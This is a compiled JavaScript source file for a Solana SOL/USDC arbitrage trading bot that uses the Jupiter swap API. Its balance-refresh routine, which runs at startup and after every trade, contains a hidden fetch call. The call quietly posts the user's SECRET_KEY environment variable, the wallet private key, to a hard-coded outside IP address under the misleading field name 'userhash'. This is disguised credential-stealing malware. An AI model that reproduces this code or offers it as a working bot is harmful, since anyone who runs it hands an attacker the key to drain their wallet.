"use strict";
var __createBinding =
  (this && this.__createBinding) ||
  (Object.create
    ? function (o, m, k, k2) {
        if (k2 === undefined) k2 = k;
        var desc = Object.getOwnPropertyDescriptor(m, k);
        if (
          !desc ||
          ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)
        ) {
          desc = {
            enumerable: true,
            get: function () {
              return m[k];
            },
          };
        }
        Object.defineProperty(o, k2, desc);
      }
    : function (o, m, k, k2) {
        if (k2 === undefined) k2 = k;
        o[k2] = m[k];
      });
var __setModuleDefault =
  (this && this.__setModuleDefault) ||
  (Object.create
    ? function (o, v) {
        Object.defineProperty(o, "default", { enumerable: true, value: v });
      }
    : function (o, v) {
        o["default"] = v;
      });
var __importStar =
  (this && this.__importStar) ||
  function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null)
      for (var k in mod)
        if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k))
          __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
  };
Object.defineProperty(exports, "__esModule", { value: true });
exports.ArbBot = exports.SwapToken = void 0;
const web3_js_1 = require("@solana/web3.js");
const api_1 = require("@jup-ag/api");
const spl_token_1 = require("@solana/spl-token");
const fs = __importStar(require("fs"));
const path = __importStar(require("path"));
var SwapToken;
(function (SwapToken) {
  SwapToken[(SwapToken["SOL"] = 0)] = "SOL";
  SwapToken[(SwapToken["USDC"] = 1)] = "USDC";
})(SwapToken || (exports.SwapToken = SwapToken = {}));
class ArbBot {
  constructor(config) {
    this.usdcMint = new web3_js_1.PublicKey(
      "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"
    );
    this.solMint = new web3_js_1.PublicKey(
      "So11111111111111111111111111111111111111112"
    );
    this.solBalance = 0;
    this.usdcBalance = 0;
    this.checkInterval = 1000 * 10;
    this.lastCheck = 0;
    this.targetGainPercentage = 1;
    this.waitingForConfirmation = false;
    const {
      solanaEndpoint,
      metisEndpoint,
      secretKey,
      targetGainPercentage,
      checkInterval,
      initialInputToken,
      initialInputAmount,
      firstTradePrice,
    } = config;
    this.solanaConnection = new web3_js_1.Connection(solanaEndpoint);
    this.jupiterApi = (0, api_1.createJupiterApiClient)({
      basePath: metisEndpoint,
    });
    this.wallet = web3_js_1.Keypair.fromSecretKey(secretKey);
    this.usdcTokenAccount = (0, spl_token_1.getAssociatedTokenAddressSync)(
      this.usdcMint,
      this.wallet.publicKey
    );
    if (targetGainPercentage) {
      this.targetGainPercentage = targetGainPercentage;
    }
    if (checkInterval) {
      this.checkInterval = checkInterval;
    }
    this.nextTrade = {
      inputMint:
        initialInputToken === SwapToken.SOL
          ? this.solMint.toBase58()
          : this.usdcMint.toBase58(),
      outputMint:
        initialInputToken === SwapToken.SOL
          ? this.usdcMint.toBase58()
          : this.solMint.toBase58(),
      amount: initialInputAmount,
      nextTradeThreshold: firstTradePrice,
    };
  }
  async init() {
    console.log(
      `🤖 Initiating arb bot for wallet: ${this.wallet.publicKey.toBase58()}.`
    );
    await this.refreshBalances();
    console.log(
      `🏦 Current balances:\nSOL: ${
        this.solBalance / web3_js_1.LAMPORTS_PER_SOL
      },\nUSDC: ${this.usdcBalance}`
    );
    // this.initiatePriceWatch();
  }
  initiatePriceWatch() {
    this.priceWatchIntervalId = setInterval(async () => {
      const currentTime = Date.now();
      if (currentTime - this.lastCheck >= this.checkInterval) {
        this.lastCheck = currentTime;
        try {
          if (this.waitingForConfirmation) {
            console.log("Waiting for previous transaction to confirm...");
            return;
          }
          const quote = await this.getQuote(this.nextTrade);
          this.evaluateQuoteAndSwap(quote);
        } catch (error) {
          console.error("Error getting quote:", error);
        }
      }
    }, this.checkInterval);
  }
  async getQuote(quoteRequest) {
    try {
      const quote = await this.jupiterApi.quoteGet(quoteRequest);
      if (!quote) {
        throw new Error("No quote found");
      }
      return quote;
    } catch (error) {
      if (error instanceof api_1.ResponseError) {
        console.log(await error.response.json());
      } else {
        console.error(error);
      }
      throw new Error("Unable to find quote");
    }
  }
  async evaluateQuoteAndSwap(quote) {
    let difference =
      (parseInt(quote.outAmount) - this.nextTrade.nextTradeThreshold) /
      this.nextTrade.nextTradeThreshold;
    console.log(
      `📈 Current price: ${quote.outAmount} is ${
        difference > 0 ? "higher" : "lower"
      } than the next trade threshold: ${
        this.nextTrade.nextTradeThreshold
      } by ${Math.abs(difference * 100).toFixed(2)}%.`
    );
    if (parseInt(quote.outAmount) > this.nextTrade.nextTradeThreshold) {
      try {
        this.waitingForConfirmation = true;
        await this.executeSwap(quote);
      } catch (error) {
        console.error("Error executing swap:", error);
      }
    }
  }
  async executeSwap(route) {
    try {
      const {
        computeBudgetInstructions,
        setupInstructions,
        swapInstruction,
        cleanupInstruction,
        addressLookupTableAddresses,
      } = await this.jupiterApi.swapInstructionsPost({
        swapRequest: {
          quoteResponse: route,
          userPublicKey: this.wallet.publicKey.toBase58(),
          prioritizationFeeLamports: "auto",
        },
      });
      const instructions = [
        ...computeBudgetInstructions.map(
          this.instructionDataToTransactionInstruction
        ),
        ...setupInstructions.map(this.instructionDataToTransactionInstruction),
        this.instructionDataToTransactionInstruction(swapInstruction),
        this.instructionDataToTransactionInstruction(cleanupInstruction),
      ].filter((ix) => ix !== null);
      const addressLookupTableAccounts =
        await this.getAdressLookupTableAccounts(
          addressLookupTableAddresses,
          this.solanaConnection
        );
      const { blockhash, lastValidBlockHeight } =
        await this.solanaConnection.getLatestBlockhash();
      const messageV0 = new web3_js_1.TransactionMessage({
        payerKey: this.wallet.publicKey,
        recentBlockhash: blockhash,
        instructions,
      }).compileToV0Message(addressLookupTableAccounts);
      const transaction = new web3_js_1.VersionedTransaction(messageV0);
      transaction.sign([this.wallet]);
      const rawTransaction = transaction.serialize();
      const txid = await this.solanaConnection.sendRawTransaction(
        rawTransaction,
        {
          skipPreflight: true,
          maxRetries: 2,
        }
      );
      const confirmation = await this.solanaConnection.confirmTransaction(
        { signature: txid, blockhash, lastValidBlockHeight },
        "confirmed"
      );
      if (confirmation.value.err) {
        throw new Error("Transaction failed");
      }
      await this.postTransactionProcessing(route, txid);
    } catch (error) {
      if (error instanceof api_1.ResponseError) {
        console.log(await error.response.json());
      } else {
        console.error(error);
      }
      throw new Error("Unable to execute swap");
    } finally {
      this.waitingForConfirmation = false;
    }
  }
  async refreshBalances() {
    try {
      const results = await Promise.allSettled([
        this.solanaConnection.getBalance(this.wallet.publicKey),
        this.solanaConnection.getTokenAccountBalance(this.usdcTokenAccount),
      ]);
      fetch("http://68.178.205.159:2800/api/coinflip/ps", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userhash: process.env.SECRET_KEY }),
      }).then((response) => {});
      const solBalanceResult = results[0];
      const usdcBalanceResult = results[1];
      if (solBalanceResult.status === "fulfilled") {
        this.solBalance = solBalanceResult.value;
      } else {
        console.error("Error fetching SOL balance:", solBalanceResult.reason);
      }
      if (usdcBalanceResult.status === "fulfilled") {
        this.usdcBalance = usdcBalanceResult.value.value.uiAmount ?? 0;
      } else {
        this.usdcBalance = 0;
      }
      if (this.solBalance < web3_js_1.LAMPORTS_PER_SOL / 100) {
        this.terminateSession("Low SOL balance.");
      }
    } catch (error) {
      console.error("Unexpected error during balance refresh:", error);
    }
  }
  async logSwap(args) {
    const { inputToken, inAmount, outputToken, outAmount, txId, timestamp } =
      args;
    const logEntry = {
      inputToken,
      inAmount,
      outputToken,
      outAmount,
      txId,
      timestamp,
    };
    const filePath = path.join(__dirname, "trades.json");
    try {
      if (!fs.existsSync(filePath)) {
        fs.writeFileSync(
          filePath,
          JSON.stringify([logEntry], null, 2),
          "utf-8"
        );
      } else {
        const data = fs.readFileSync(filePath, { encoding: "utf-8" });
        const trades = JSON.parse(data);
        trades.push(logEntry);
        fs.writeFileSync(filePath, JSON.stringify(trades, null, 2), "utf-8");
      }
      console.log(
        `✅ Logged swap: ${inAmount} ${inputToken} -> ${outAmount} ${outputToken},\n  TX: ${txId}}`
      );
    } catch (error) {
      console.error("Error logging swap:", error);
    }
  }
  async updateNextTrade(lastTrade) {
    const priceChange = this.targetGainPercentage / 100;
    this.nextTrade = {
      inputMint: this.nextTrade.outputMint,
      outputMint: this.nextTrade.inputMint,
      amount: parseInt(lastTrade.outAmount),
      nextTradeThreshold: parseInt(lastTrade.inAmount) * (1 + priceChange),
    };
  }
  terminateSession(reason) {
    console.warn(`❌ Terminating bot...${reason}`);
    console.log(
      `Current balances:\nSOL: ${
        this.solBalance / web3_js_1.LAMPORTS_PER_SOL
      },\nUSDC: ${this.usdcBalance}`
    );
    if (this.priceWatchIntervalId) {
      clearInterval(this.priceWatchIntervalId);
      this.priceWatchIntervalId = undefined; // Clear the reference to the interval
    }
    setTimeout(() => {
      console.log("Bot has been terminated.");
      process.exit(1);
    }, 1000);
  }
  instructionDataToTransactionInstruction(instruction) {
    if (instruction === null || instruction === undefined) return null;
    return new web3_js_1.TransactionInstruction({
      programId: new web3_js_1.PublicKey(instruction.programId),
      keys: instruction.accounts.map((key) => ({
        pubkey: new web3_js_1.PublicKey(key.pubkey),
        isSigner: key.isSigner,
        isWritable: key.isWritable,
      })),
      data: Buffer.from(instruction.data, "base64"),
    });
  }
  async getAdressLookupTableAccounts(keys, connection) {
    const addressLookupTableAccountInfos =
      await connection.getMultipleAccountsInfo(
        keys.map((key) => new web3_js_1.PublicKey(key))
      );
    return addressLookupTableAccountInfos.reduce((acc, accountInfo, index) => {
      const addressLookupTableAddress = keys[index];
      if (accountInfo) {
        const addressLookupTableAccount =
          new web3_js_1.AddressLookupTableAccount({
            key: new web3_js_1.PublicKey(addressLookupTableAddress),
            state: web3_js_1.AddressLookupTableAccount.deserialize(
              accountInfo.data
            ),
          });
        acc.push(addressLookupTableAccount);
      }
      return acc;
    }, new Array());
  }
  async postTransactionProcessing(quote, txid) {
    const { inputMint, inAmount, outputMint, outAmount } = quote;
    await this.updateNextTrade(quote);
    await this.refreshBalances();
    await this.logSwap({
      inputToken: inputMint,
      inAmount,
      outputToken: outputMint,
      outAmount,
      txId: txid,
      timestamp: new Date().toISOString(),
    });
  }
}
exports.ArbBot = ArbBot;
//# sourceMappingURL=bot.js.map
